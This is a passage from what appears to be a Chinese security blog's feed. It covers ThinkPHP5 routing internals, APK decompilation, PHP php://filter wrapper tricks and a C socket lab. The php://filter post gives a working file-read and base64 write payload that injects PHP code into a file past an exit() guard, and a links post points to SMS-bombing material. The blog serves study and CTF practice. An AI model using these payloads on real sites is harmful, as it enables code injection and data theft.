class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&apos;&apos; ?: 1); //输出1</span><br><span class="line">var_dump(&apos;0&apos; ?: 1); //输出1</span><br><span class="line">var_dump(&apos;hello&apos; ?: 1); //输出hello</span><br></pre></td></tr></table></figure></p><h3 id="2-3-return-include-file"><a href="#2-3-return-include-file" class="headerlink" title="2.3.return include file"></a>2.3.<code>return include file</code></h3><p>存在该文件成功会返回<code>True</code>，否则会报错。</p><h3 id="2-4-SERVER-39-PATH-INFO-39"><a href="#2-4-SERVER-39-PATH-INFO-39" class="headerlink" title="2.4. $_SERVER[&#39;PATH_INFO&#39;]"></a>2.4. <code>$_SERVER[&#39;PATH_INFO&#39;]</code></h3><p>该全局变量会返回文件名后类似<code>/abc/def</code>这样的字符串，但是不包含<code>?a=1</code>类型的query字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_SERVER[&apos;PATH_INFO&apos;]);</span><br></pre></td></tr></table></figure></p><p>访问<code>http://localhost/test.php/hello/good/?a=asdf</code><br>返回<code>/hello/good</code></p><h3 id="2-5-闭包函数"><a href="#2-5-闭包函数" class="headerlink" title="2.5.闭包函数"></a>2.5.闭包函数</h3><p>闭包函数其实也叫匿名函数，该函数可以进行赋值，当做参数传入到函数中。<br>闭包函数要访问外界的变量需要使用<code>use</code>关键字，该关键字类似于传参。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getMoney() &#123;</span><br><span class="line">    $rmb = 1;</span><br><span class="line">    $dollar = 6;</span><br><span class="line">    $func = function() use ( $rmb ) &#123;</span><br><span class="line">        echo $rmb;</span><br><span class="line">        echo $dollar;</span><br><span class="line">    &#125;;</span><br><span class="line">    $func();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getMoney();</span><br><span class="line">//输出1</span><br><span class="line">//找不到dollar报错。</span><br></pre></td></tr></table></figure></p><h3 id="2-6-reflectionClass"><a href="#2-6-reflectionClass" class="headerlink" title="2.6.reflectionClass"></a>2.6.reflectionClass</h3><p>反射类，可以利用反射类对类进行诸如获取常量，方法，路径等操作，是间接的控制类。</p><h3 id="2-7-new-static"><a href="#2-7-new-static" class="headerlink" title="2.7.new static()"></a>2.7.new static()</h3><p>返回本对象的实例，与new self()的区别在于，new self()无论谁来调用都是返回自身的实例，而new static()返回的是new调用者自己的实例。</p><h2 id="三、框架流程"><a href="#三、框架流程" class="headerlink" title="三、框架流程"></a>三、框架流程</h2><p>先说一下分析流程：入口文件-&gt;基础文件-&gt;自动加载-&gt;run方法-&gt;路由分析</p><p>（1）入口文件public/index.php<br>就三行代码，先加载基础文件，再调用app类的run方法开启流程，先看基础文件。<br><img src="/img/1570200671007.png" alt=""><br>（2）基础文件thinkphp/base.php，载入Loader、注册自动加载、注册错误异常机制、实现日志、注册类库别名。<br>主要看注册自动加载<br><img src="/img/1570200950746.png" alt=""><br>（3）自动加载流程think\loader<br>将loader::autoload注册为自动加载函数<br><img src="/img/1570201455618.png" alt=""><br>第125行，利用findFile找到对应类的对应文件名，然后在132行进行包含该文件。<br><img src="/img/1570201519707.png" alt=""><br>（1）回到入口文件，第21行代码开始执行框架流程，调用think\app类的run方法，该方法对应整个框架的流程。<br>该方法我们主要分析路由流程，即我们如何访问到index模块的Test控制器的hello方法。<br><img src="/img/1570202657783.png" alt=""></p><h2 id="四、路由分析"><a href="#四、路由分析" class="headerlink" title="四、路由分析"></a>四、路由分析</h2><p>分析流程：路由检测-&gt;路由解析-&gt;路由调度<br>我们主要通过代码分析，框架是如何通过路由调度到Index模块Test控制器的hello方法<br><img src="/img/1570203307639.png" alt=""></p><h3 id="4-1-路由检测"><a href="#4-1-路由检测" class="headerlink" title="4.1.路由检测"></a>4.1.路由检测</h3><p>路由检测主要功能是获取用户提交的路由信息，默认是pathinfo。<br>（1）从run函数进入think\app\routecheck()函数<br>检测路由缓存默认不开启，我们就先跳过，进入request的path函数。<br><img src="/img/1570276191626.png" alt=""><br>（2）因为App类并没有request属性，所以会调用父类Containner的魔术方法<strong>get()<br><img src="/img/1570276388297.png" alt=""><br>（3）</strong>get()方法调用Containner.make()方法<br>第268行，从本地属性name获取到request的命名空间赋值给abstract。<br>在271行，返回request对象。<br><img src="/img/1570452223816.png" alt=""><br>（4）因此调到request.path()方法中<br>request.path()方法在720行调用本类的pathinfo()方法<br><img src="/img/1570452552631.png" alt=""><br>（5）request.pathinfo()方法<br>因为我们使用的默认路由，所以在第三个判断通过SERVER函数来获取路由信息<code>/index/Test/hello</code>。<br>第705行将最左边的反斜线去掉，然后返回pathinfo信息<code>index/Test/hello</code>。<br><img src="/img/1570452676638.png" alt=""><br>（6）返回到request.path()方法<br>之后只是去除后缀信息，就进行返回<br>（7）最后返回到routecheck()函数，路由获取与检测完毕。</p><h3 id="4-2-路由解析"><a href="#4-2-路由解析" class="headerlink" title="4.2.路由解析"></a>4.2.路由解析</h3><p>路由解析主要是对路由进行判断过滤，检查合法性，最后将其赋值到module、controller、action中。<br>（1）路由解析从app.routecheck函数开始。<br>routecheck函数，在第604行调用route.check方法。<br><img src="/img/1570453293024.png" alt=""><br>（2）route.check方法<br>前面方法与路由有关，默认都是false，可以跳过，关键在最后901行<br>主要就是new了一个UrlDispatch对象。<br><img src="/img/1570453375278.png" alt=""><br>这个对象实际上是<code>think\route\dispatch\Url</code>对象，我们简称URL对象<br><img src="/img/1570453561552.png" alt=""><br>（3）new一个不存在的类，根据命名空间触发自动加载<br><img src="/img/1570453643568.png" alt=""><br>（4）因为URL对象没有构造方法，所以触发父类Dispatch对象的构造方法<br>主要将第三个参数dispatch，即我们的路由赋值到<code>$this-&gt;dispatch</code>以便之后调用。<br><img src="/img/1570453749089.png" alt=""><br>（5）构造完成，返回到routecheck方法。<br>routecheck方法再将这个URL对象返回，而在他的上层方法run方法，调用了其返回的URL对象的init的方法。<br>（6）url.init()方法<br>init方法首先在第23行，对该路由通过parseurl方法进行解析。<br><img src="/img/1570454059351.png" alt=""><br>（7）url.parseurl()方法<br>在第48行通过rule.parseUrlPath对路由解析。<br><img src="/img/1570454179801.png" alt=""><br>（8）rule.parseUrlPath()方法<br>进入第二个判断，利用<code>explode</code>函数以<code>/</code>分割，将3个值组成数组并返回。<br><img src="/img/1570454270043.png" alt=""><br>（9）url.parseurl()方法<br>利用array_shift函数，这个函数功能是将数组第一个值取出，然后分别赋值给模块、控制器、操作、参数。<br><img src="/img/1570454442522.png" alt=""><br>然后在第88行，将路由封装返回。<br><img src="/img/1570454597843.png" alt=""><br>（10）返回到init方法<br>之后进行实例化Module对象，并调用其init方法。<br><img src="/img/1570454701855.png" alt=""><br>（11）Module对象的父类依然是Dispatch，通过其进行构造<br>依然是将第三个参数赋给<br><img src="/img/1570454775818.png" alt=""><br>（12）Module.init()<br>在第31行获取路由信息。<br>在第39行对模块信息进行html和转换为小写处理。<br>进入第二个判断，需要模块不在黑名单类，并且该模块存在。<br><img src="/img/1570455158655.png" alt=""><br>第58行将模块进行初始化<br><img src="/img/1570455332680.png" alt=""><br>之后设置控制器名和操作名<br><img src="/img/1570455472698.png" alt=""><br>然后返回Module对象回来到run方法，赋值给<code>$dispatch</code>变量，之后通过该变量进行路由调度，至此，路由解析结束。</p><h3 id="4-3-路由调度"><a href="#4-3-路由调度" class="headerlink" title="4.3.路由调度"></a>4.3.路由调度</h3><p>路由调度<br>（1）app.run()<br>调用middleware中间件类的add方法，将闭包函数传入，顾名思义其实就是添加一个中间件，我们具体分析下。<br><img src="/img/1570456531472.png" alt=""><br>（2）middleware.add()<br>调用buildmidlleware()设置中间件，在第70行将中间件添加到中间件队列中，等会要调用。<br><img src="/img/1570456596942.png" alt=""><br>（3）app.run()方法<br>进入dispatch方法，进行调用。<br><img src="/img/1570456845597.png" alt=""><br>（4）middleware.dispatch()<br>调用本地resolve方法，其返回值作为参数之一。<br><img src="/img/1570456880416.png" alt=""><br>（5）middleware.resovle()<br>第176行，弹出中间件，之后就调用app中的闭包函数。<br><img src="/img/1570456981303.png" alt=""><br>（6）app.run()的闭包函数<br>data是为空的，所以这个函数调用了dispatch对象的run方法。<br><img src="/img/1570457105406.png" alt=""><br>（7）Dispatch.run()<br>前面基本没什么用，主要在第168行调用了其父类Module的exec()方法。<br><img src="/img/1570457194013.png" alt=""><br>（8）Module.exec()<br>第91行调用app类的controller方法来实例化控制器。<br><img src="/img/1570457342030.png" alt=""><br>（9）App.controller()<br>调用parseModuleAndClass来解析模块和类<br><img src="/img/1570457476767.png" alt=""><br>（10）App.parseModuleAndClass()<br>如果name值由斜线调用第一个判断，name值其实就是我们刚才解析设置的controller，将类设置为我们的控制器类。<br>否则进入parseclass来获得控制器。<br><img src="/img/1570457567485.png" alt=""><br>（11）App.parseClass()<br>具体看的有点晕，就是利用系统的一些值配置来获得控制器的具体类位置，最后返回module和controller。<br><img src="/img/1570457858906.png" alt=""><br>（12）返回到controller()函数<br>其利用App.<strong>get()方法来获得我们指定的那个类。<br>（13）app.</strong>get()<br><img src="/img/1570458023998.png" alt=""><br>（14）Container.make()<br>make方法不再像刚才进入270判断内，二十进入274的判断里面，并不在绑定函数中，进入else。<br>else中进入App.invokeClass()函数中。<br><img src="/img/1570458066480.png" alt=""><br>（15）Container.invokeClass()函数<br>该函数在第424行，创建控制的反射类，判断反射类中有没有<code>__make</code>魔术方法，在435行获取其控制方法，显然我们没设置，跳过。<br>最后在439行创建类的一个新实例，并将参数传入，返回其实例。<br><img src="/img/1570458209613.png" alt=""><br>（16）Container.make()函数<br>最后将该实例放入，instances属性中，方便之后调用，返回该对象，回到exec()函数<br>（17）Module.exec()函数<br>之后调用middleware的controller方法，其实依然是调用add方法，并传入一个闭包函数，相当于在传入一个中间件。<br><img src="/img/1570459563063.png" alt=""><br>（18）middleware.controller<br>看，相当于调用，add方法，但是第二个参数为<code>controller</code>。<br><img src="/img/1570459814950.png" alt=""><br>（19）Module.exec()函数<br>之后在第140行调用行dispatch，相当于执行这个中间件。<br>（20）执行这个闭包函数<br>第105行获取操作名，第112行利用反射类获取操作方法，并获取其操作名，在request类中设置操作属性为操作名。<br>第119行获取变量。在第135行将实例，反射类方法，参数传入到App.invokeReflectMethod方法中<br><img src="/img/1570460039044.png" alt=""><br>（21）App.invokeReflectMethod()方法<br>第395行代码调用反射类方法的InvokeArgs方法，会去调用我们的实例化类的指定方法。<br><img src="/img/1570460707610.png" alt=""><br>（22）Test.hello()<br>成功调用我们的控制类方法，至此路由调度结束。<br><img src="/img/1570461677792.png" alt=""></p><h3 id="五、输出返回"><a href="#五、输出返回" class="headerlink" title="五、输出返回"></a>五、输出返回</h3><p>（1）返回到我们的闭包函数<br>我们的hello()方法返回了字符串<code>hello world</code>，传递给$data变量，并将其传入父类Dispatch的autoResponse()方法自动输出。<br><img src="/img/1570461759167.png" alt=""><br>（2）Dispatch.autoResponse()<br>进入第二个判断，首先判断是否是Ajax，根据结果做不同处理。<br>第182行，进入Resonpse.create()方法<br><img src="/img/1570461893953.png" alt=""><br>（3）Resonpse.create()<br>第一行代码根据类型获取不同的类<br>最后设置http返回码，header头，数据。<br>最后通过new static()来创建自身的实例。<br><img src="/img/1570462154435.png" alt=""><br>（4）Response.__construct()<br>设置一些返回的http参数。<br><img src="/img/1570462595440.png" alt=""><br>（5）Dispatch.autoResponse()<br>返回response对象<br>（6）返回到中间件resolve函数<br>也是返回response对象<br><img src="/img/1570462682222.png" alt=""><br>（7）返回到Dispatch.run()方法<br>也是返回response对象<br><img src="/img/1570462729966.png" alt=""><br>（8）最终返回到App.run()方法<br>也是返回response对象<br><img src="/img/1570462769307.png" alt=""><br>（9）还记得入口文件在调用app.run()方法后还调用了send方法吗？<br>就是调用Response对象的send()方法，最后通过send方法设置http参数，发送数据到客户端，至此thinkphp5流程结束。<br><img src="/img/1570462867779.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/888/" target="_blank" rel="noopener">https://paper.seebug.org/888/</a><br><a href="https://www.kancloud.cn/manual/thinkphp5/118003" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118003</a><br><a href="https://www.jianshu.com/p/c88d5bb329b4" target="_blank" rel="noopener">https://www.jianshu.com/p/c88d5bb329b4</a><br><a href="https://www.cnblogs.com/wqy415/p/7890116.html" target="_blank" rel="noopener">https://www.cnblogs.com/wqy415/p/7890116.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近在n1ctf遇到thinkphp的利用链挖掘，以及上学期很火的rce漏洞，都需要对tp5框架流程有一个清晰的认识。可能记
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>apk反编译</title>
    <link href="http://yoursite.com/2019/09/20/apk%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>http://yoursite.com/2019/09/20/apk反编译/</id>
    <published>2019-09-20T08:20:38.000Z</published>
    <updated>2019-09-20T08:20:38.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做题的时候遇到web类安卓题目，需要反编译，记录一下。</p><h2 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h2><p>下载地址：<a href="https://github.com/iBotPeaches/Apktool/blob/gh-pages/install/index.md" target="_blank" rel="noopener">https://github.com/iBotPeaches/Apktool/blob/gh-pages/install/index.md</a><br>将apk文件放在当前目录，然后通过以下命令处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk</span><br></pre></td></tr></table></figure></p><p>会解压出文件，对应的xml文件不会是乱码。</p><h2 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h2><p>下载地址：<a href="http://www.onlinedown.net/soft/989451.htm" target="_blank" rel="noopener">http://www.onlinedown.net/soft/989451.htm</a><br>将apk文件后缀名改为zip或rar，进行解压，在解压文件中中能找到classes.dex文件。<br>将他复制到工具目录中，通过以下命令进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure></p><p>将会在当前目录生成对应的classes-dex2jar.jar</p><h2 id="jd-gui"><a href="#jd-gui" class="headerlink" title="jd-gui"></a>jd-gui</h2><p>下载地址：<a href="http://java-decompiler.github.io/" target="_blank" rel="noopener">http://java-decompiler.github.io/</a><br>打开工具，通过工具打开上一步生成的jar文件即可。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/96875c707f8a" target="_blank" rel="noopener">https://www.jianshu.com/p/96875c707f8a</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在做题的时候遇到web类安卓题目，需要反编译，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;apktool&quot;&gt;&lt;a href=&quot;#apktool&quot; c
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP filter伪协议的黑魔法</title>
    <link href="http://yoursite.com/2019/09/20/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <id>http://yoursite.com/2019/09/20/PHP伪协议的黑魔法/</id>
    <published>2019-09-19T16:17:43.000Z</published>
    <updated>2019-09-19T16:18:14.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.<br>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。<br><strong>格式：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[read/write]/convert.base64-[encode/decode]/resource=xxx</span><br></pre></td></tr></table></figure></p><h2 id="读操作"><a href="#读操作" class="headerlink" title="读操作"></a>读操作</h2><p>对于include、readfile、file_put_contents等函数，<br>可以利用<code>php://filter/convert.base64-encode/resource=index.php</code>来读取文件内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = file_get_contents(&quot;php://filter/convert.base64-encode/resource=test.php&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure></p><p>运行得到base64流<br><img src="/img/1568908781652.png" alt=""></p><h2 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h2><p>一般网上提到写操作的比较少，但是这个点对于绕过waf是非常重要的。<br>对于写操作，我们可以传入base64字符串来绕过waf，然后利用php伪协议将我们的base64字符串进行解码传入到指定文件。<br>示例代码，需要文件名完全可控，文件内容可能被waf或者部分可控，就可以利用php伪协议。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($_GET[&apos;filename&apos;], &apos;&lt;?php exit;?&gt;&apos; . $_GET[&apos;content&apos;]);</span><br></pre></td></tr></table></figure></p><p>php的base64解码是每4位一组进行解码，对于非英文数字下划线会跳过，所以<code>&lt;?php exit;?&gt;</code>字符串只匹配到<code>phpexit</code>，因而需要我们拼接一位。<br>假设我们要传入文件内容为<code>&lt;?php phpinfo();</code><br>将该字符串base64编码：<code>PD9waHAgcGhwaW5mbygpOw==</code><br>因此payload：<code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=APD9waHAgcGhwaW5mbygpOw==</code></p><p>成功将代码注入文件：<br><img src="/img/1568909493284.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" target="_blank" rel="noopener">https://www.cnblogs.com/dubhe-/p/9997842.html</a><br><a href="https://blog.csdn.net/weixin_44304686/article/details/91542750" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44304686/article/details/91542750</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.&lt;br&gt;php://filter是一种
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>链接</title>
    <link href="http://yoursite.com/2019/09/18/%E9%93%BE%E6%8E%A5/"/>
    <id>http://yoursite.com/2019/09/18/链接/</id>
    <published>2019-09-18T15:57:10.000Z</published>
    <updated>2019-09-18T15:57:10.809Z</updated>
    
    <content type="html"><![CDATA[<p>phpStorm调试：<a href="https://www.php.cn/php-weizijiaocheng-387522.html" target="_blank" rel="noopener">https://www.php.cn/php-weizijiaocheng-387522.html</a><br>短信轰炸：<a href="https://www.anquanke.com/post/id/93878" target="_blank" rel="noopener">https://www.anquanke.com/post/id/93878</a><br>windows defender关闭：<a href="https://www.win7qjb.com/jiaocheng/41093.html" target="_blank" rel="noopener">https://www.win7qjb.com/jiaocheng/41093.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phpStorm调试：&lt;a href=&quot;https://www.php.cn/php-weizijiaocheng-387522.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.php.cn/php-weizijiaoche
      
    
    </summary>
    
      <category term="资料" scheme="http://yoursite.com/categories/%E8%B5%84%E6%96%99/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>C语言套接字编程</title>
    <link href="http://yoursite.com/2019/09/18/C%E8%AF%AD%E8%A8%80%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/09/18/C语言套接字编程/</id>
    <published>2019-09-18T14:48:19.000Z</published>
    <updated>2019-09-18T14:48:19.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学校最近布置了个套接字实验，挺有意思的，记录一下。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/img/1568816545574.png" alt=""></p><h2 id="服务器端代码"><a href="#服务器端代码" class="headerlink" title="服务器端代码"></a>服务器端代码</h2><p>服务器端，前部分代码大部分都为套路，从while循环开始，正式编程。<br>通过accept函数返回值得到已连接套接字，之后我们都要使用这个套接字与客户端进行通信，同时该函数还会将客户端套接字通过指针进行返回，我们可以通过该套接字获取客户端的信息。<br>如果要退出，直接exit就可以。<br>第二层while对read进行循环，可以循环读取客户端输入的数据，这是一个阻塞函数，当客户端提交数据，将会调用该函数，该函数返回用户输入的字符串长度，而用户输入的字符串是通过指针传到buff值进行返回，要退出循环可以用exit。<br>read之后可以对用户数据进行一系列处理。<br>处理之后，可以用wirte函数进行返回处理的结果，write函数通过已连接套接字通信，第二个值为结果，第三个值为长度。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 8888</span><br><span class="line">#define BACKLOG 1</span><br><span class="line">#define MAXDATASIZE 100</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int listenfd, connectfd,i,n,m,sin_size;</span><br><span class="line">struct sockaddr_in server;</span><br><span class="line">struct sockaddr_in client;</span><br><span class="line">socklen_t addrlen;</span><br><span class="line">char buf[MAXDATASIZE],rever[MAXDATASIZE]; </span><br><span class="line"></span><br><span class="line">if((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;socket() error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int opt = SO_REUSEADDR;</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt));</span><br><span class="line"></span><br><span class="line">bzero(&amp;server, sizeof(server));</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_port = htons(PORT);</span><br><span class="line">server.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">if(bind(listenfd, (struct sockaddr *)&amp;server, sizeof(server)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;Bind() error&quot;);</span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(listen(listenfd, BACKLOG) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;listen() error&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sin_size = sizeof(struct sockaddr_in);</span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">if((connectfd = accept(listenfd,(struct sockaddr *)&amp;client,&amp;sin_size)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;accept error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;You get a connection from %s:%d\n&quot;,inet_ntoa(client.sin_addr),client.sin_port);</span><br><span class="line">send(connectfd,&quot;Welcome.\n&quot;,22,0);</span><br><span class="line">while((n=read(connectfd,buf,MAXDATASIZE)) &gt;0)</span><br><span class="line">&#123;</span><br><span class="line">if(strcmp(buf,&quot;quit&quot;) == 0)</span><br><span class="line">&#123;</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s\n&quot;,buf);</span><br><span class="line">m=n;</span><br><span class="line">n--;</span><br><span class="line">for(i=0;i&lt;m-1;i++)</span><br><span class="line">&#123;</span><br><span class="line">rever[n-1] = buf[i];</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rever[m-1] = &apos;\0&apos;;</span><br><span class="line">printf(&quot;Send reverse string:%s\n&quot;,rever);</span><br><span class="line">write(connectfd,rever,m);</span><br><span class="line">&#125;</span><br><span class="line">close(connectfd);</span><br><span class="line">&#125;</span><br><span class="line">close(listenfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h2><p>connect函数之前，大部分都为套路。<br>getsockname函数功能是获得本地信息，只要传入一个本地套接字id号就可以，返回套接字结构通过指针进行返回，可以通过该套接字结构得到ip地址和端口。<br>getpeername函数功能是获得对方信息，传入的是sock函数返回的套接字<br>之后是while循环，将用户输入通过write函数传送到服务器端，参数为字符串和字符串长度。<br>通过read函数接收服务器端的返回值，最后依然是通过exit进行退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 